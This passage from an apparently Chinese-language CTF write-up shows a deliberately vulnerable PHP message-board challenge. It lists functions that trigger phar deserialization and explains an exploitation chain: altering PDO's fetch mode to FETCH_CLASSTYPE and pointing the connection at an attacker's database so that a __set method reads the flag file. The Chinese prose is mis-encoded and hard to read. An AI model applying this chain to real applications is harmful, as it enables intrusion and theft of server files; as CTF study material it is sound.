invoke__">header</span>(<span class="hljs-string">&quot;Location: index.html&quot;</span>);<br>   <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$Message</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserMessage</span>();<br><br><br><span class="hljs-variable">$userMessage</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserMessage</span>();<br><span class="hljs-variable">$database</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PDO_connect</span>();<br><span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">init</span>();<br><span class="hljs-variable">$db</span> = <span class="hljs-variable">$database</span>-&gt;<span class="hljs-title function_ invoke__">get_connection</span>();<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$action</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$action</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$action</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;message&#x27;</span>:<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;write messageing&quot;</span>;<br>            <span class="hljs-variable">$decodedMessage</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;encodedMessage&#x27;</span>]);<br>            <br>            <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">writeMessage</span>(<span class="hljs-variable">$decodedMessage</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>===<span class="hljs-literal">false</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å†™å…¥å¤±è´¥&quot;</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-variable">$filePath</span> = <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">get_filePath</span>();<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>] = <span class="hljs-variable">$filePath</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç•™è¨€å·²å†™å…¥: &quot;</span>. <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">get_filePath</span>();<br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;editMessage&#x27;</span>:<br>                <span class="hljs-variable">$decodedEditMessage</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;encodedEditMessage&#x27;</span>]);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>]))&#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">editMessage</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>],<span class="hljs-variable">$decodedEditMessage</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç•™è¨€å·²æˆåŠŸæ›´æ”¹&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ“ä½œå¤±è´¥ï¼Œè¯·é‡æ–°å°è¯•&quot;</span>;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;delete&#x27;</span>:<br>            <span class="hljs-variable">$message</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>]?<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>]:<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;message_path&#x27;</span>];<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$userMessage</span>-&gt;<span class="hljs-title function_ invoke__">deleteMessage</span>(<span class="hljs-variable">$message</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$msg</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ç•™è¨€å·²æˆåŠŸåˆ é™¤&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æ“ä½œå¤±è´¥ï¼Œè¯·é‡æ–°å°è¯•&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;clean&#x27;</span>:<br>                <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;rm log/*&#x27;</span>);<br>                <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;rm txt/*&#x27;</span>);<br>    &#125;<br><br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œè°ƒç”¨deleteMessageæ–¹æ³•ä¼ å…¥æˆ‘ä»¬è¦åˆ é™¤çš„æ–‡ä»¶è·¯å¾„</p><p><img src="https://cdn.clown2024.cn/image-20241225223721578.png" alt="image-20241225223721578"></p><h2 id="pharååºåˆ—åŒ–çš„è§¦å‘"><a href="#pharååºåˆ—åŒ–çš„è§¦å‘" class="headerlink" title="pharååºåˆ—åŒ–çš„è§¦å‘"></a>pharååºåˆ—åŒ–çš„è§¦å‘</h2><p>ç„¶åè¿™é‡Œè°ƒç”¨äº†file_exists()å‡½æ•°åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œä¸€å¼€å§‹å®¡åˆ°è¿™é‡Œæˆ‘æ˜¯ä¸çŸ¥é“è¿™èƒ½è§¦å‘pharååºåˆ—åŒ–çš„ï¼Œåœ¨é˜Ÿå‹æé†’ä¸‹æ‰çŸ¥é“ğŸ¥²ï¼Œç„¶åæ‰¾äº†æ‰¾ï¼Œè¿™ç¯‡æ–‡ç« æœ‰ä»‹ç»èƒ½å¤Ÿè§¦å‘pharçš„å‡½æ•°ï¼š<a href="https://blog.csdn.net/weixin_53912233/article/details/136201466">https://blog.csdn.net/weixin_53912233/article/details/136201466</a></p><p>è¿™é‡Œä¹Ÿè®°å½•ä¸€ä¸‹èƒ½å¤Ÿè§¦å‘pharååºåˆ—åŒ–çš„æ–¹æ³•</p><p>ä¸€äº›è§¦å‘pharçš„æ•æ„Ÿå‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">fileatime / filectime / filemtime<br>stat / fileinode / fileowner / filegroup / fileperms<br>file / file_get_contents / readfile / fopen<br>file_exists / is_dir / is_executable / is_file <br>is_link / is_readable / is_writeable / is_writable<br>parse_ini_file<br>unlink<br>copy<br></code></pre></td></tr></table></figure><p>å…¶ä»–è§¦å‘å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">image<br>    exif_thumbnail<br>    exif_imagetype<br>    imageloadfont<br>    imagecreatefrom***<br>    getimagesize<br>    getimagesizefromstring<br>hash<br>    hash_hmac_file<br>    hash_file<br>    hash_update_file<br>    md5_file<br>    sha1_file<br>file / url<br>    get_meta_tags<br>    get_headers<br><br></code></pre></td></tr></table></figure><h2 id="å¯»æ‰¾ååºåˆ—åŒ–çš„ç‚¹"><a href="#å¯»æ‰¾ååºåˆ—åŒ–çš„ç‚¹" class="headerlink" title="å¯»æ‰¾ååºåˆ—åŒ–çš„ç‚¹"></a>å¯»æ‰¾ååºåˆ—åŒ–çš„ç‚¹</h2><p>ç„¶åå°±æ˜¯æ‰¾è¦è§¦å‘ä»€ä¹ˆé“¾å­äº†ï¼Œä½†æ˜¯å…¨æ–‡å°±ä¸€ä¸ª_seté­”æœ¯æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserMessage</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$filePath</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filePath = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">generateFileName</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeMessage</span>(<span class="hljs-params"><span class="hljs-variable">$message</span></span>) </span>&#123;<br><br><br>        <span class="hljs-comment">// å†™å…¥ç•™è¨€åˆ°æ–‡ä»¶ä¸­</span><br>        <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filePath, <span class="hljs-variable">$message</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editMessage</span>(<span class="hljs-params"><span class="hljs-variable">$path</span>,<span class="hljs-variable">$newMessage</span></span>) </span>&#123;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$path</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$newMessage</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_filePath</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;filePath;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span> = <span class="hljs-variable">$value</span>;<br>           <span class="hljs-variable">$a</span> =  <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filePath).<span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;/var/www/html/log/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;filePath).<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-variable">$a</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deleteMessage</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>        <span class="hljs-variable">$path</span> = <span class="hljs-variable">$path</span>.<span class="hljs-string">&quot;.txt&quot;</span>;<br>        <span class="hljs-comment">// åˆ é™¤ç•™è¨€æ–‡ä»¶</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$path</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$path</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$msg</span> === <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateFileName</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$timestamp</span> = <span class="hljs-title function_ invoke__">microtime</span>(<span class="hljs-literal">true</span>);<br>        <span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$timestamp</span>);<br>        <span class="hljs-variable">$fileName</span> = <span class="hljs-string">&quot;./txt/&quot;</span>.<span class="hljs-variable">$hash</span> . <span class="hljs-string">&quot;.txt&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileName</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readMessage</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// è¯»å–å¹¶è¿”å›ç•™è¨€æ–‡ä»¶çš„å†…å®¹</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;filePath)) &#123;<br>            <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filePath);<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$message</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ²¡æƒ³åˆ°ä»€ä¹ˆè§¦å‘çš„æ–¹æ³•ï¼Œå¦‚æœèƒ½è§¦å‘ä¸”filepathå¯æ§ï¼Œå°±å¯ä»¥ç›´æ¥è¯»å–flagæ–‡ä»¶ç„¶åå†™åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œç„¶åå°±æƒ³èƒ½ä¸èƒ½æ‰“åŸç”Ÿç±»è¯»æ–‡ä»¶ä»€ä¹ˆçš„ï¼Œä¹Ÿæ²¡æœ‰æ‰¾åˆ°ç›¸å…³çš„æ–¹æ³•ï¼Œæ‰€ä»¥å°±å¡ç€äº†ã€‚</p><p>å”¯ä¸€è§£å°±æ˜¯gxnå¤§å“¥çš„è§£ï¼Œçœ‹äº†gxnå¤§å“¥wpå‘ç°æ˜¯ç”¨PDOæ¥è§¦å‘ï¼Œç„¶åçªç„¶æƒ³èµ·æ¥æˆ‘åœ¨æœç´¢çš„æ—¶å€™ä¹Ÿçœ‹åˆ°ç›¸å…³çš„æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/6699?time__1311=n4+xnD0Dg7KQq0KGQ3DsA3xCwqWqobqxET2oTD#toc-3">https://xz.aliyun.com/t/6699?time__1311=n4%2BxnD0Dg7KQq0KGQ3DsA3xCwqWqobqxET2oTD#toc-3</a></p><p>è™½ç„¶è¿™é‡Œä¹Ÿæ˜¯ç”¨PDOçš„ä½†æ˜¯å’Œæœ¬é¢˜çš„è§£æ³•ä¸ä¸€æ ·ï¼Œè¿™ç¯‡æ–‡ç« é‡Œçš„pharæœ‰æœºä¼šä¹Ÿå­¦ä¸€ä¸‹æ°´ç¯‡æ–‡ç« </p><p>æ¥ä¸‹æ¥è¯´è¯´æœ¬é¢˜çš„è§£æ³•ï¼Œè¿™ä¸ªæ€è·¯çœ‹å®Œä¹‹åç¡®å®å¦™ï¼Œæ˜¯æœ¬èœé¸¡æƒ³ä¸å‡ºæ¥çš„æ€è·¯ğŸ˜­</p><p>è¿™é‡Œå…³é”®å°±æ˜¯è§¦å‘__seté­”æœ¯æ–¹æ³•ï¼Œæˆ‘ä»¬çŸ¥é“__setæ–¹æ³•å°±æ˜¯è®¿é—®ä¸å­˜åœ¨çš„å±æ€§çš„æ—¶å€™ä¼šè§¦å‘ï¼Œæˆ‘ä»¬å¯ä»¥å…³æ³¨ä¸€ä¸‹PDO_connect.phpè¿™ä¸ªç±»</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PDO_connect</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$pdo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$con_options</span> = [];<span class="hljs-comment">//use to set options of PDO connections</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$smt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;con_options = <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&quot;dsn&quot;</span>=&gt;<span class="hljs-string">&quot;mysql:host=localhost:3306;dbname=users;charset=utf8&quot;</span>,<br>            <span class="hljs-string">&#x27;host&#x27;</span>=&gt;<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>            <span class="hljs-string">&#x27;port&#x27;</span>=&gt;<span class="hljs-string">&#x27;3306&#x27;</span>,<br>            <span class="hljs-string">&#x27;user&#x27;</span>=&gt;<span class="hljs-string">&#x27;joker&#x27;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>=&gt;<span class="hljs-string">&#x27;joker&#x27;</span>,<br>            <span class="hljs-string">&#x27;charset&#x27;</span>=&gt;<span class="hljs-string">&#x27;utf8&#x27;</span>,<br>            <span class="hljs-string">&#x27;options&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>=&gt;PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>,<br>                PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span> =&gt; PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>)<br>        );<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_connection</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;dsn&#x27;</span>], <span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;user&#x27;</span>], <span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;options&#x27;</span>][PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>])&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>, <span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;options&#x27;</span>][PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>]);<br>            &#125;<br>            <br>            <br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;options&#x27;</span>][PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>]))&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>, <span class="hljs-variable">$this</span>-&gt;con_options[<span class="hljs-string">&#x27;options&#x27;</span>][PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>]);<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Connection Error: &#x27;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;conn;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªoptionï¼Œå¯ä»¥è®¾ç½®ä¸€äº›PDOç›¸å…³çš„é€‰é¡¹ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªé€‰é¡¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PDO::ATTR_DEFAULT_FETCH_MODE<br>PDO::ATTR_ERRMODE<br></code></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªé€‰é¡¹å¯ä»¥ç¿»ä¸€ç•ªå®˜æ–¹æ–‡æ¡£çŸ¥é“æ˜¯å¹²ä»€ä¹ˆçš„ï¼š<a href="https://www.php.net/manual/zh/pdostatement.fetch.php">https://www.php.net/manual/zh/pdostatement.fetch.php</a></p><p>ç¬¬äºŒä¸ªæ˜¯è®¾ç½®æŠ¥é”™æ–¹å¼ï¼Œä¸æ˜¯ä»€ä¹ˆé‡ç‚¹å†…å®¹</p><p><img src="https://cdn.clown2024.cn/image-20241226000208435.png" alt="image-20241226000208435"></p><p>é‡ç‚¹æ˜¯ç¬¬ä¸€ä¸ª</p><p><img src="https://cdn.clown2024.cn/image-20241226000229404.png" alt="image-20241226000229404"></p><p>ä¹Ÿå°±æ˜¯è®¾ç½®é»˜è®¤è·å–æ•°æ®æ—¶å€™çš„å½¢å¼ï¼Œé‚£å°±æ˜¯å’Œè°ƒç”¨fetchæ–¹æ³•æœ‰å…³ï¼Œè¿™é‡Œå¯ä»¥å†çœ‹ä¸€ä¸‹User.phpçš„æºç </p><p>ç±»é‡Œé¢æœ‰ä¸€ä¸ªlogæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">try</span>&#123;<br><br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username = :username&quot;</span>;<br>        <span class="hljs-variable">$pdo</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">get_connection</span>();<br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br><br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>(<span class="hljs-string">&#x27;:username&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;username);<br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„fetchæ–¹æ³•æ‰§è¡Œçš„æ˜¯é»˜è®¤è·å–å‚æ•°ï¼Œå…¶ä»–çš„éƒ½æ˜¯å†™æ­»çš„ï¼Œæ¬¸ç„¶åæ€è·¯å°±æ‰“å¼€äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æˆ‘ä»¬å·²çŸ¥çš„pharååºåˆ—åŒ–å»æ”¹å˜è¿™ä¸ªè¿æ¥å±æ€§ï¼Œè‡³äºæ”¹ä»€ä¹ˆå‘¢ï¼Œ<del>æˆ‘ä»¬å¯ä»¥æ”¹æˆä¸‹é¢è¿™ä¸ª262144</del></p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment">  * Determine the class name from the value of first column.</span><br><span class="hljs-comment">  * <span class="hljs-doctag">@link</span> https://php.net/manual/en/pdo.constants.php#pdo.constants.fetch-classtype</span><br><span class="hljs-comment">  */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FETCH_CLASSTYPE</span> = <span class="hljs-number">262144</span>;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç‚¹è¿›æºç ç¿»å°±å¯ä»¥ç¿»åˆ°è¿™ä¸ªå±æ€§ï¼Œè¯¥å±æ€§çš„æ„æ€å°±æ˜¯æ ¹æ®ç¬¬ä¸€åˆ—çš„å€¼æ¥ç¡®å®šç±»å</p><blockquote><p>å…·ä½“æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Œå°±æ˜¯æˆ‘ä»¬fetchè¿”å›çš„æ—¶å€™ï¼ŒPDO ä¼šæ£€æŸ¥ç»“æœé›†çš„ç¬¬ä¸€åˆ—ï¼Œå¹¶å°†è¯¥åˆ—çš„å€¼ä½œä¸ºç±»åæ¥åˆ›å»ºå¯¹è±¡ã€‚å¦‚æœè¯¥åˆ—çš„å€¼ä¸ºå­—ç¬¦ä¸² â€œclassnameâ€ï¼Œåˆ™ PDO ä¼šå°è¯•å®ä¾‹åŒ–ä¸€ä¸ªåä¸º â€œclassnameâ€ çš„ç±»çš„å¯¹è±¡ã€‚</p><p><del>ç„¶åè¿™é‡Œè¿˜æœ‰ä¸€ç‚¹ï¼Œä»–ä¼šå°†å…¶ä½™çš„åˆ—åè®¾ç½®ä¸ºè¯¥å¯¹è±¡çš„å±æ€§ï¼Œä¹Ÿå°±æ˜¯è‡ªåŠ¨åˆå§‹åŒ–ä¸”è®¿é—®å±æ€§å¹¶èµ‹å€¼äº†</del>è¿™é‡Œæœ‰é—®é¢˜åé¢è¯´ğŸ¥²</p><p>è¿™é‡Œè¿˜é‡æ–°è°ƒç”¨äº†ä¸€éget_connectionæ–¹æ³•ï¼Œæ‰€ä»¥è¿™ä¹Ÿç¡®å®šæ˜¯æˆ‘ä»¬çš„å…¥å£ç±»äº†</p></blockquote><p>é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡pharä¿®æ”¹PDO_connectçš„é…ç½®ï¼Œè®©ä»–è¿æ¥æˆ‘ä»¬è‡ªå·±çš„è¿œç¨‹æ•°æ®åº“ï¼Œç„¶åè¿”å›ä¸€ä¸ªå­˜åœ¨çš„å¯¹è±¡ï¼Œä½†æ˜¯åˆ—åæ˜¯ä¸å­˜åœ¨çš„å±æ€§ï¼Œä»è€Œå¯ä»¥è§¦å‘æˆ‘ä»¬çš„_setæ–¹æ³•</p><p>æˆ‘ä»¬æœ¬åœ°å¯ä»¥æµ‹è¯•ä¸€ä¸‹ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;setup!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$conn</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=localhost:3306;dbname=test;charset=utf8&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>);<br><span class="hljs-comment">// $conn-&gt;setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE,PDO::FETCH_CLASSTYPE);</span><br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_DEFAULT_FETCH_MODE</span>, PDO::<span class="hljs-variable constant_">FETCH_CLASS</span> | PDO::<span class="hljs-variable constant_">FETCH_CLASSTYPE</span>);<br><span class="hljs-comment">// $conn-&gt;setAttribute(PDO::ATTR_CLASSTYPE, 